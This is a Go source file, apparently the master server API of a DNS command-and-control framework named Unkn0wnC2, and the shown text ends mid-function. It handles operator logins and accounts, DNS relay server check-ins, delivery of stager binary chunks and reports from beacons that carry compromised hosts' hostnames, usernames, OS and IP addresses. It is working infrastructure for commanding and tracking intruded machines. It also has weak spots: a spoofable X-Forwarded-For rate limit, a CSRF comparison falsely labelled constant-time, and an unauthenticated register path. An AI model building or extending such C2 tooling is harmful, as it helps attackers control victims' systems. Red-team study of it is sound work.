// Package main implements the HTTPS API for the Unkn0wnC2 Master Server.
// This provides RESTful endpoints for operator management, DNS server coordination,
// and beacon/task orchestration across distributed DNS C2 servers.
package main

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/golang-jwt/jwt/v5"
	"github.com/gorilla/mux"
)

// APIServer wraps the HTTP server and provides API functionality
type APIServer struct {
	db          *MasterDatabase
	config      Config
	jwtSecret   []byte
	authLimiter *RateLimiter // Rate limiter for auth endpoints
	apiLimiter  *RateLimiter // Rate limiter for API endpoints
	dnsLimiter  *RateLimiter // Rate limiter for DNS server endpoints
}

// NewAPIServer creates a new API server instance
func NewAPIServer(db *MasterDatabase, config Config) *APIServer {
	return &APIServer{
		db:          db,
		config:      config,
		jwtSecret:   []byte(config.JWTSecret),
		authLimiter: NewRateLimiter(5, time.Minute),    // 5 login attempts per minute
		apiLimiter:  NewRateLimiter(100, time.Minute),  // 100 API requests per minute
		dnsLimiter:  NewRateLimiter(1000, time.Minute), // 1000 DNS server API calls per minute
	}
}

// Claims represents JWT token claims
type Claims struct {
	OperatorID string `json:"operator_id"`
	Username   string `json:"username"`
	Role       string `json:"role"`
	JTI        string `json:"jti"` // JWT ID for token revocation
	jwt.RegisteredClaims
}

// RateLimiter implements a token bucket rate limiter per IP address
type RateLimiter struct {
	visitors map[string]*Visitor
	mu       sync.RWMutex
	rate     int           // requests per window
	window   time.Duration // time window
}

// Visitor tracks rate limit state for a single IP
type Visitor struct {
	tokens     int
	lastUpdate time.Time
	mu         sync.Mutex
}

// NewRateLimiter creates a new rate limiter
// rate: maximum requests per window
// window: time window duration (e.g., 1 minute)
func NewRateLimiter(rate int, window time.Duration) *RateLimiter {
	rl := &RateLimiter{
		visitors: make(map[string]*Visitor),
		rate:     rate,
		window:   window,
	}

	// Cleanup old visitors every 5 minutes
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			rl.cleanup()
		}
	}()

	return rl
}

// getVisitor returns the visitor for an IP, creating if needed
func (rl *RateLimiter) getVisitor(ip string) *Visitor {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	visitor, exists := rl.visitors[ip]
	if !exists {
		visitor = &Visitor{
			tokens:     rl.rate,
			lastUpdate: time.Now(),
		}
		rl.visitors[ip] = visitor
	}

	return visitor
}

// Allow checks if a request from the IP should be allowed
func (rl *RateLimiter) Allow(ip string) bool {
	visitor := rl.getVisitor(ip)
	visitor.mu.Lock()
	defer visitor.mu.Unlock()

	now := time.Now()
	elapsed := now.Sub(visitor.lastUpdate)

	// Refill tokens based on elapsed time
	if elapsed >= rl.window {
		visitor.tokens = rl.rate
		visitor.lastUpdate = now
	}

	if visitor.tokens > 0 {
		visitor.tokens--
		return true
	}

	return false
}

// cleanup removes old visitors to prevent memory leak
func (rl *RateLimiter) cleanup() {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	cutoff := time.Now().Add(-10 * time.Minute)
	toDelete := []string{}

	// First pass: identify visitors to delete (without holding individual locks)
	for ip, visitor := range rl.visitors {
		visitor.mu.Lock()
		if visitor.lastUpdate.Before(cutoff) {
			toDelete = append(toDelete, ip)
		}
		visitor.mu.Unlock()
	}

	// Second pass: delete identified visitors
	for _, ip := range toDelete {
		delete(rl.visitors, ip)
	}
}

// Response structures

type ErrorResponse struct {
	Error   string `json:"error"`
	Message string `json:"message,omitempty"`
}

type SuccessResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
}

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LoginResponse struct {
	Token     string    `json:"token"`
	ExpiresAt time.Time `json:"expires_at"`
	Operator  struct {
		ID       string `json:"id"`
		Username string `json:"username"`
		Role     string `json:"role"`
	} `json:"operator"`
}

type DNSServerCheckinRequest struct {
	DNSServerID string                 `json:"dns_server_id"`
	APIKey      string                 `json:"api_key"`
	Status      string                 `json:"status"`
	Stats       map[string]interface{} `json:"stats"`
}

type BeaconReportRequest struct {
	DNSServerID string `json:"dns_server_id"`
	APIKey      string `json:"api_key"`
	Beacon      struct {
		ID        string    `json:"id"`
		Hostname  string    `json:"hostname"`
		Username  string    `json:"username"`
		OS        string    `json:"os"`
		Arch      string    `json:"arch"`
		IPAddress string    `json:"ip_address"`
		FirstSeen time.Time `json:"first_seen"`
		LastSeen  time.Time `json:"last_seen"`
	} `json:"beacon"`
}

type TaskCreateRequest struct {
	BeaconID string `json:"beacon_id"`
	Command  string `json:"command"`
}

type ResultSubmitRequest struct {
	DNSServerID string `json:"dns_server_id"`
	APIKey      string `json:"api_key"`
	TaskID      string `json:"task_id"`
	BeaconID    string `json:"beacon_id"`
	ChunkIndex  int    `json:"chunk_index"`
	TotalChunks int    `json:"total_chunks"`
	Data        string `json:"data"`
}

type TaskProgressRequest struct {
	DNSServerID    string `json:"dns_server_id"`
	APIKey         string `json:"api_key"`
	TaskID         string `json:"task_id"`
	BeaconID       string `json:"beacon_id"`
	ReceivedChunks int    `json:"received_chunks"`
	TotalChunks    int    `json:"total_chunks"`
	Status         string `json:"status"` // "receiving", "assembling", "complete"
}

// Middleware

// loggingMiddleware logs all API requests
func (api *APIServer) loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()

		// Call the next handler
		next.ServeHTTP(w, r)

		// Log request
		if api.config.Debug {
			fmt.Printf("[API] %s %s - %s - %v\n",
				r.Method,
				r.RequestURI,
				r.RemoteAddr,
				time.Since(start))
		}
	})
}

// rateLimitMiddleware provides rate limiting based on IP address
func (api *APIServer) rateLimitMiddleware(limiter *RateLimiter) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Extract IP address
			ip := r.RemoteAddr
			if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
				// Use first IP in X-Forwarded-For chain
				ip = strings.Split(forwarded, ",")[0]
				ip = strings.TrimSpace(ip)
			} else if realIP := r.Header.Get("X-Real-IP"); realIP != "" {
				ip = realIP
			}

			// Strip port if present
			if host, _, err := net.SplitHostPort(ip); err == nil {
				ip = host
			}

			// Check rate limit
			if !limiter.Allow(ip) {
				w.Header().Set("Content-Type", "application/json")
				w.Header().Set("Retry-After", "60") // Suggest retry after 60 seconds
				w.WriteHeader(http.StatusTooManyRequests)
				json.NewEncoder(w).Encode(ErrorResponse{
					Error:   "rate_limit_exceeded",
					Message: "Too many requests. Please try again later.",
				})
				return
			}

			next.ServeHTTP(w, r)
		})
	}
}

// csrfMiddleware validates CSRF tokens for state-changing requests (POST/PUT/DELETE/PATCH)
// This protects against Cross-Site Request Forgery attacks
func (api *APIServer) csrfMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Only check CSRF for state-changing methods
		if r.Method == "POST" || r.Method == "PUT" || r.Method == "DELETE" || r.Method == "PATCH" {
			// Skip CSRF check if using API authentication (Authorization header)
			// CSRF is primarily a browser concern
			if r.Header.Get("Authorization") != "" {
				next.ServeHTTP(w, r)
				return
			}

			// Get CSRF token from cookie
			csrfCookie, err := r.Cookie("csrf_token")
			if err != nil {
				api.sendError(w, http.StatusForbidden, "missing CSRF token")
				return
			}

			// Get CSRF token from request header
			csrfHeader := r.Header.Get("X-CSRF-Token")
			if csrfHeader == "" {
				api.sendError(w, http.StatusForbidden, "missing CSRF token in header")
				return
			}

			// Compare tokens (constant-time comparison to prevent timing attacks)
			if len(csrfCookie.Value) != len(csrfHeader) || csrfCookie.Value != csrfHeader {
				api.sendError(w, http.StatusForbidden, "invalid CSRF token")
				return
			}
		}

		next.ServeHTTP(w, r)
	})
}

// authMiddleware validates JWT tokens for operator endpoints
func (api *APIServer) authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var tokenString string

		// Try to get token from cookie first (web UI)
		if cookie, err := r.Cookie("session_token"); err == nil {
			tokenString = cookie.Value
		} else {
			// Fallback to Authorization header (API clients, backward compatibility)
			authHeader := r.Header.Get("Authorization")
			if authHeader == "" {
				api.sendError(w, http.StatusUnauthorized, "missing authorization")
				return
			}

			// Check for Bearer token
			parts := strings.Split(authHeader, " ")
			if len(parts) != 2 || parts[0] != "Bearer" {
				api.sendError(w, http.StatusUnauthorized, "invalid authorization format")
				return
			}

			tokenString = parts[1]
		}

		if tokenString == "" {
			api.sendError(w, http.StatusUnauthorized, "missing token")
			return
		}

		// Parse and validate token
		claims := &Claims{}
		token, err := jwt.ParseWithClaims(tokenString, claims, func(token *jwt.Token) (interface{}, error) {
			// Validate signing method
			if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
				return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
			}
			return api.jwtSecret, nil
		})

		if err != nil || !token.Valid {
			api.sendError(w, http.StatusUnauthorized, "invalid token")
			return
		}

		// Check if the session is revoked (JWT revocation via JTI)
		if claims.JTI != "" {
			isRevoked, err := api.db.IsSessionRevoked(claims.JTI)
			if err != nil {
				api.sendError(w, http.StatusInternalServerError, "failed to check session status")
				return
			}
			if isRevoked {
				api.sendError(w, http.StatusUnauthorized, "session has been revoked")
				return
			}
		}

		// Add claims to request context for handlers to use
		r = r.WithContext(r.Context())
		r.Header.Set("X-Operator-ID", claims.OperatorID)
		r.Header.Set("X-Operator-Username", claims.Username)
		r.Header.Set("X-Operator-Role", claims.Role)
		r.Header.Set("X-JWT-ID", claims.JTI) // Add JTI for logout handler

		next.ServeHTTP(w, r)
	})
}

// dnsServerAuthMiddleware validates DNS server API keys
func (api *APIServer) dnsServerAuthMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Extract DNS server ID and API key from request
		var dnsServerID, apiKey string

		// Try to get from JSON body (read and restore)
		if r.Method == http.MethodPost || r.Method == http.MethodPut {
			// Read the body
			bodyBytes, err := io.ReadAll(r.Body)
			if err != nil {
				api.sendError(w, http.StatusBadRequest, "failed to read request body")
				return
			}
			r.Body.Close()

			// Parse to get auth info
			var authData struct {
				DNSServerID string `json:"dns_server_id"` // Used by most endpoints
				ServerID    string `json:"server_id"`     // Used by registration endpoint
				APIKey      string `json:"api_key"`
			}
			if err := json.Unmarshal(bodyBytes, &authData); err != nil {
				api.sendError(w, http.StatusBadRequest, "invalid request body")
				return
			}

			// Support both dns_server_id and server_id (for registration)
			dnsServerID = authData.DNSServerID
			if dnsServerID == "" {
				dnsServerID = authData.ServerID
			}
			apiKey = authData.APIKey

			// Restore the body for the handler to read
			r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
		} else {
			// Try query parameters for GET requests
			dnsServerID = r.URL.Query().Get("dns_server_id")
			apiKey = r.URL.Query().Get("api_key")
		}

		// Special handling for registration endpoint - allow with missing or unverified credentials
		if strings.HasSuffix(r.URL.Path, "/register") {
			// Store the extracted IDs for handler use (even if empty, handler will validate)
			r.Header.Set("X-DNS-Server-ID", dnsServerID)
			r.Header.Set("X-DNS-Server-APIKey", apiKey)
			next.ServeHTTP(w, r)
			return
		}

		if dnsServerID == "" || apiKey == "" {
			api.sendError(w, http.StatusUnauthorized, "missing dns_server_id or api_key")
			return
		}

		// Verify API key
		valid, err := api.db.VerifyDNSServerAPIKey(dnsServerID, apiKey)
		if err != nil {
			api.sendError(w, http.StatusInternalServerError, "authentication error")
			return
		}

		if !valid {
			api.sendError(w, http.StatusUnauthorized, "invalid credentials")
			return
		}

		// Store DNS server ID in header for handler
		r.Header.Set("X-DNS-Server-ID", dnsServerID)

		next.ServeHTTP(w, r)
	})
}

// Helper methods

func (api *APIServer) sendError(w http.ResponseWriter, status int, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(ErrorResponse{
		Error:   http.StatusText(status),
		Message: message,
	})
}

func (api *APIServer) sendSuccess(w http.ResponseWriter, message string, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(SuccessResponse{
		Success: true,
		Message: message,
		Data:    data,
	})
}

func (api *APIServer) sendJSON(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(data)
}

// Authentication Endpoints

// handleLogin authenticates an operator and returns a JWT token
func (api *APIServer) handleLogin(w http.ResponseWriter, r *http.Request) {
	var req LoginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		fmt.Printf("[API] Failed to decode login request: %v\n", err)
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	fmt.Printf("[API] Login attempt for user: %s\n", req.Username)

	// Verify credentials
	operatorID, role, err := api.db.VerifyOperatorCredentials(req.Username, req.Password)
	if err != nil {
		fmt.Printf("[API] Credential verification failed: %v\n", err)
		api.sendError(w, http.StatusUnauthorized, "invalid credentials")

		// Log failed login attempt
		api.db.LogAuditEvent("", "login_failed", "operator", req.Username,
			fmt.Sprintf("Failed login attempt for username: %s", req.Username),
			r.RemoteAddr)
		return
	}

	fmt.Printf("[API] Credentials verified for user: %s (ID: %s)\n", req.Username, operatorID)

	// Generate JWT token with unique JTI (JWT ID) for revocation support
	jti := generateID()
	expiresAt := time.Now().Add(time.Duration(api.config.SessionTimeout) * time.Minute)
	claims := &Claims{
		OperatorID: operatorID,
		Username:   req.Username,
		Role:       role,
		JTI:        jti,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(expiresAt),
			IssuedAt:  jwt.NewNumericDate(time.Now()),
			Issuer:    "unkn0wnc2-master",
		},
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	tokenString, err := token.SignedString(api.jwtSecret)
	if err != nil {
		fmt.Printf("[API] Failed to sign JWT token: %v\n", err)
		api.sendError(w, http.StatusInternalServerError, "failed to generate token")
		return
	}

	fmt.Printf("[API] JWT token generated for user: %s\n", req.Username)

	// Create session record in database for revocation support
	// Note: Use SHA256 for token hash (not bcrypt) since JWT tokens exceed bcrypt's 72-byte limit
	sessionID := generateID()
	tokenHash := sha256Hash(tokenString)
	err = api.db.CreateSession(sessionID, operatorID, jti, tokenHash, r.RemoteAddr, r.UserAgent(), expiresAt.Unix())
	if err != nil {
		fmt.Printf("[API] Failed to create session: %v\n", err)
		api.sendError(w, http.StatusInternalServerError, "failed to create session")
		return
	}

	fmt.Printf("[API] Session created successfully for user: %s\n", req.Username)

	// Log successful login
	api.db.LogAuditEvent(operatorID, "login_success", "operator", operatorID,
		fmt.Sprintf("Successful login for %s", req.Username), r.RemoteAddr)

	// Set JWT as httpOnly secure cookie for better security (XSS protection)
	http.SetCookie(w, &http.Cookie{
		Name:     "session_token",
		Value:    tokenString,
		Path:     "/",
		HttpOnly: true,                    // Prevent JavaScript access (XSS protection)
		Secure:   true,                    // HTTPS only
		SameSite: http.SameSiteStrictMode, // CSRF protection
		Expires:  expiresAt,
	})

	// Generate CSRF token for additional protection
	csrfToken := generateID()
	http.SetCookie(w, &http.Cookie{
		Name:     "csrf_token",
		Value:    csrfToken,
		Path:     "/",
		HttpOnly: false, // JavaScript needs to read this
		Secure:   true,
		SameSite: http.SameSiteStrictMode,
		Expires:  expiresAt,
	})

	// Return success response (no token in JSON for security)
	response := LoginResponse{
		Token:     "", // No longer return token in response body
		ExpiresAt: expiresAt,
	}
	response.Operator.ID = operatorID
	response.Operator.Username = req.Username
	response.Operator.Role = role

	api.sendJSON(w, response)
}

// handleLogout invalidates the operator's session
func (api *APIServer) handleLogout(w http.ResponseWriter, r *http.Request) {
	operatorID := r.Header.Get("X-Operator-ID")
	username := r.Header.Get("X-Operator-Username")
	jti := r.Header.Get("X-JWT-ID")

	// Revoke the session by JTI
	if jti != "" {
		if err := api.db.RevokeSessionByJTI(jti); err != nil {
			api.sendError(w, http.StatusInternalServerError, "failed to revoke session")
			return
		}
	}

	// Clear cookies
	http.SetCookie(w, &http.Cookie{
		Name:     "session_token",
		Value:    "",
		Path:     "/",
		HttpOnly: true,
		Secure:   true,
		MaxAge:   -1, // Delete cookie immediately
	})
	http.SetCookie(w, &http.Cookie{
		Name:     "csrf_token",
		Value:    "",
		Path:     "/",
		HttpOnly: false,
		Secure:   true,
		MaxAge:   -1, // Delete cookie immediately
	})

	// Log logout
	api.db.LogAuditEvent(operatorID, "logout", "operator", operatorID,
		fmt.Sprintf("Logout for %s", username), r.RemoteAddr)

	api.sendSuccess(w, "logged out successfully", nil)
}

// handleCurrentUser returns the current authenticated user's information
func (api *APIServer) handleCurrentUser(w http.ResponseWriter, r *http.Request) {
	operatorID := r.Header.Get("X-Operator-ID")
	username := r.Header.Get("X-Operator-Username")
	role := r.Header.Get("X-Operator-Role")

	if operatorID == "" {
		api.sendError(w, http.StatusUnauthorized, "no authenticated user")
		return
	}

	// Return current user info
	userData := map[string]interface{}{
		"id":       operatorID,
		"username": username,
		"role":     role,
	}

	api.sendSuccess(w, "current user retrieved", userData)
}

// User Management Endpoints

// handleListOperators returns all operator accounts
func (api *APIServer) handleListOperators(w http.ResponseWriter, r *http.Request) {
	operators, err := api.db.GetAllOperators()
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve operators")
		return
	}

	api.sendSuccess(w, "operators retrieved", operators)
}

// handleGetOperator retrieves a single operator
func (api *APIServer) handleGetOperator(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	operatorID := vars["id"]

	operator, err := api.db.GetOperator(operatorID)
	if err != nil {
		api.sendError(w, http.StatusNotFound, "operator not found")
		return
	}

	api.sendSuccess(w, "operator retrieved", operator)
}

// handleCreateOperator creates a new operator account
func (api *APIServer) handleCreateOperator(w http.ResponseWriter, r *http.Request) {
	// Only admins can create operators
	role := r.Header.Get("X-Operator-Role")
	if role != "admin" {
		api.sendError(w, http.StatusForbidden, "insufficient permissions")
		return
	}

	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
		Role     string `json:"role"`
		Email    string `json:"email"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate required fields
	if req.Username == "" || req.Password == "" || req.Role == "" {
		api.sendError(w, http.StatusBadRequest, "username, password, and role are required")
		return
	}

	// Validate role
	if req.Role != "admin" && req.Role != "operator" && req.Role != "viewer" {
		api.sendError(w, http.StatusBadRequest, "invalid role (must be admin, operator, or viewer)")
		return
	}

	// Check if username already exists
	exists, err := api.db.CheckUsernameExists(req.Username)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to check username")
		return
	}
	if exists {
		api.sendError(w, http.StatusConflict, "username already exists")
		return
	}

	// Generate operator ID
	operatorID := generateID()

	// Create operator
	if err := api.db.CreateOperator(operatorID, req.Username, req.Password, req.Role, req.Email); err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to create operator")
		return
	}

	// Log audit event
	currentOperatorID := r.Header.Get("X-Operator-ID")
	api.db.LogAuditEvent(currentOperatorID, "operator_created", "operator", operatorID,
		fmt.Sprintf("Created operator: %s (role: %s)", req.Username, req.Role), r.RemoteAddr)

	api.sendSuccess(w, "operator created successfully", map[string]string{"id": operatorID})
}

// handleUpdateOperator updates operator details
func (api *APIServer) handleUpdateOperator(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	operatorID := vars["id"]

	// Check permissions
	currentOperatorID := r.Header.Get("X-Operator-ID")
	currentRole := r.Header.Get("X-Operator-Role")

	// Operators can only update themselves, admins can update anyone
	if currentRole != "admin" && currentOperatorID != operatorID {
		api.sendError(w, http.StatusForbidden, "insufficient permissions")
		return
	}

	var req struct {
		Username string `json:"username"`
		Role     string `json:"role"`
		Email    string `json:"email"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate role if provided
	if req.Role != "" && req.Role != "admin" && req.Role != "operator" && req.Role != "viewer" {
		api.sendError(w, http.StatusBadRequest, "invalid role")
		return
	}

	// Non-admins cannot change role
	if currentRole != "admin" && req.Role != "" {
		api.sendError(w, http.StatusForbidden, "cannot change your own role")
		return
	}

	// Update operator
	if err := api.db.UpdateOperator(operatorID, req.Username, req.Role, req.Email); err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to update operator")
		return
	}

	// Log audit event
	api.db.LogAuditEvent(currentOperatorID, "operator_updated", "operator", operatorID,
		fmt.Sprintf("Updated operator: %s", req.Username), r.RemoteAddr)

	api.sendSuccess(w, "operator updated successfully", nil)
}

// handleChangePassword changes an operator's password
func (api *APIServer) handleChangePassword(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	operatorID := vars["id"]

	// Check permissions
	currentOperatorID := r.Header.Get("X-Operator-ID")
	currentRole := r.Header.Get("X-Operator-Role")

	// Operators can only change their own password, admins can change anyone's
	if currentRole != "admin" && currentOperatorID != operatorID {
		api.sendError(w, http.StatusForbidden, "insufficient permissions")
		return
	}

	var req struct {
		CurrentPassword string `json:"current_password"`
		NewPassword     string `json:"new_password"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	if req.NewPassword == "" {
		api.sendError(w, http.StatusBadRequest, "new password is required")
		return
	}

	// If not admin, verify current password
	if currentRole != "admin" {
		// Get current operator's username
		operator, err := api.db.GetOperator(currentOperatorID)
		if err != nil {
			api.sendError(w, http.StatusInternalServerError, "failed to verify credentials")
			return
		}

		// Verify current password
		_, _, err = api.db.VerifyOperatorCredentials(operator["username"].(string), req.CurrentPassword)
		if err != nil {
			api.sendError(w, http.StatusUnauthorized, "current password is incorrect")
			return
		}
	}

	// Update password
	if err := api.db.UpdateOperatorPassword(operatorID, req.NewPassword); err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to update password")
		return
	}

	// Log audit event
	api.db.LogAuditEvent(currentOperatorID, "password_changed", "operator", operatorID,
		"Password changed", r.RemoteAddr)

	api.sendSuccess(w, "password changed successfully", nil)
}

// handleDeleteOperator deletes an operator account
func (api *APIServer) handleDeleteOperator(w http.ResponseWriter, r *http.Request) {
	// Only admins can delete operators
	role := r.Header.Get("X-Operator-Role")
	if role != "admin" {
		api.sendError(w, http.StatusForbidden, "insufficient permissions")
		return
	}

	vars := mux.Vars(r)
	operatorID := vars["id"]

	// Prevent deleting yourself
	currentOperatorID := r.Header.Get("X-Operator-ID")
	if currentOperatorID == operatorID {
		api.sendError(w, http.StatusBadRequest, "cannot delete your own account")
		return
	}

	// Get operator info for audit log
	operator, err := api.db.GetOperator(operatorID)
	if err != nil {
		api.sendError(w, http.StatusNotFound, "operator not found")
		return
	}

	// Delete operator
	if err := api.db.DeleteOperator(operatorID); err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to delete operator")
		return
	}

	// Log audit event
	api.db.LogAuditEvent(currentOperatorID, "operator_deleted", "operator", operatorID,
		fmt.Sprintf("Deleted operator: %s", operator["username"]), r.RemoteAddr)

	api.sendSuccess(w, "operator deleted successfully", nil)
}

// handleToggleOperatorStatus enables/disables an operator account
func (api *APIServer) handleToggleOperatorStatus(w http.ResponseWriter, r *http.Request) {
	// Only admins can toggle operator status
	role := r.Header.Get("X-Operator-Role")
	if role != "admin" {
		api.sendError(w, http.StatusForbidden, "insufficient permissions")
		return
	}

	vars := mux.Vars(r)
	operatorID := vars["id"]

	// Prevent disabling yourself
	currentOperatorID := r.Header.Get("X-Operator-ID")
	if currentOperatorID == operatorID {
		api.sendError(w, http.StatusBadRequest, "cannot disable your own account")
		return
	}

	var req struct {
		Active bool `json:"active"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Get operator info
	operator, err := api.db.GetOperator(operatorID)
	if err != nil {
		api.sendError(w, http.StatusNotFound, "operator not found")
		return
	}

	// Update status
	if err := api.db.SetOperatorActive(operatorID, req.Active); err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to update operator status")
		return
	}

	// Log audit event
	status := "disabled"
	if req.Active {
		status = "enabled"
	}
	api.db.LogAuditEvent(currentOperatorID, "operator_status_changed", "operator", operatorID,
		fmt.Sprintf("%s operator: %s", status, operator["username"]), r.RemoteAddr)

	api.sendSuccess(w, fmt.Sprintf("operator %s successfully", status), nil)
}

// DNS Server Management Endpoints

// handleListDNSServers returns all registered DNS servers
func (api *APIServer) handleListDNSServers(w http.ResponseWriter, r *http.Request) {
	servers, err := api.db.GetDNSServers()
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve DNS servers")
		return
	}

	api.sendJSON(w, map[string]interface{}{
		"servers": servers,
	})
}

// handleDNSServerCheckin processes check-in from a DNS server
func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Request) {
	var req DNSServerCheckinRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Update check-in time and detect if this is first checkin
	isFirstCheckin, err := api.db.UpdateDNSServerCheckin(dnsServerID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to update check-in")
		return
	}

	// Get pending stager cache tasks for this DNS server
	pendingCaches, err := api.db.GetPendingStagerCaches(dnsServerID)
	if err != nil {
		fmt.Printf("[API] ⚠️  Failed to get pending caches for %s: %v\n", dnsServerID, err)
		pendingCaches = []map[string]interface{}{} // Continue with empty list
	}

	// Build response with cache tasks
	var cacheTasks []map[string]interface{}
	var cacheIDs []int

	for _, cache := range pendingCaches {
		cacheTasks = append(cacheTasks, map[string]interface{}{
			"client_binary_id": cache["client_binary_id"],
			"total_chunks":     cache["total_chunks"],
			"chunks":           cache["chunks"],
		})
		cacheIDs = append(cacheIDs, cache["id"].(int))
	}

	// Mark caches as delivered
	if len(cacheIDs) > 0 {
		if err := api.db.MarkStagerCacheDelivered(cacheIDs); err != nil {
			fmt.Printf("[API] ⚠️  Failed to mark caches as delivered: %v\n", err)
		} else {
			fmt.Printf("[API] 📤 Sent %d cache task(s) to DNS server %s\n", len(cacheIDs), dnsServerID)
		}
	}

	// If this is the first checkin, broadcast domain list to all beacons
	if isFirstCheckin {
		go func() {
			// Get all active DNS domains
			domains, err := api.db.GetAllActiveDomains()
			if err != nil {
				if api.config.Debug {
					fmt.Printf("[Master] Failed to get DNS domains: %v\n", err)
				}
				return
			}

			// Get all active beacons to determine which DNS servers they're using
			activeBeacons, err := api.db.GetActiveBeacons(30)
			if err != nil {
				if api.config.Debug {
					fmt.Printf("[Master] Failed to get active beacons: %v\n", err)
				}
				return
			}

			// Build a map of DNS server IDs that have active beacons
			dnsServersWithBeacons := make(map[string]bool)
			for _, beacon := range activeBeacons {
				if serverID, ok := beacon["dns_server_id"].(string); ok && serverID != "" {
					dnsServersWithBeacons[serverID] = true
				}
			}

			// Queue domain updates ONLY for DNS servers with active beacons
			// This ensures beacons get updates from the servers they're actually using
			updateCount := 0
			for serverID := range dnsServersWithBeacons {
				if err := api.db.QueueDomainUpdate(serverID, domains); err != nil {
					if api.config.Debug {
						fmt.Printf("[Master] ⚠️  Failed to queue domain update for %s: %v\n", serverID, err)
					}
				} else {
					updateCount++
				}
			}

			if updateCount > 0 {
				fmt.Printf("[Master] 🔄 Queued domain updates for %d DNS server(s) with active beacons (new server joined: %s)\n", updateCount, dnsServerID)
				fmt.Printf("[Master] Updated domain list: %v\n", domains)
			} else {
				fmt.Printf("[Master] ℹ️  No active beacons found, no domain updates queued (new server: %s)\n", dnsServerID)
			}
		}()
	}

	// Check for pending domain updates
	pendingDomains, err := api.db.GetPendingDomainUpdates(dnsServerID)
	if err != nil {
		if api.config.Debug {
			fmt.Printf("[API] ⚠️  Failed to get pending domain updates: %v\n", err)
		}
		pendingDomains = nil
	}

	// If domain updates exist, mark them as delivered
	if len(pendingDomains) > 0 {
		if err := api.db.MarkDomainUpdateDelivered(dnsServerID); err != nil {
			fmt.Printf("[API] ⚠️  Failed to mark domain updates as delivered: %v\n", err)
		} else {
			fmt.Printf("[API] 🌐 Sent domain update to DNS server %s: %v\n", dnsServerID, pendingDomains)
		}
	}

	// Send response with pending caches and domain updates
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success":        true,
		"message":        "check-in recorded",
		"pending_caches": cacheTasks,
		"domain_updates": pendingDomains,
		"data": map[string]interface{}{
			"dns_server_id":    dnsServerID,
			"timestamp":        time.Now(),
			"is_first_checkin": isFirstCheckin,
		},
	})
}

// Beacon Management Endpoints

// handleBeaconReport processes a beacon report from a DNS server
func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request) {
	var req BeaconReportRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		if api.config.Debug {
			fmt.Printf("[API] ❌ Failed to decode beacon report: %v\n", err)
		}
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	if api.config.Debug {
		fmt.Printf("[API] 📡 Beacon report received: %s from DNS server %s\n", req.Beacon.ID, dnsServerID)
		fmt.Printf("[API]    Hostname: %s, User: %s, OS: %s, IP: %s\n",
			req.Beacon.Hostname, req.Beacon.Username, req.Beacon.OS, req.Beacon.IPAddress)
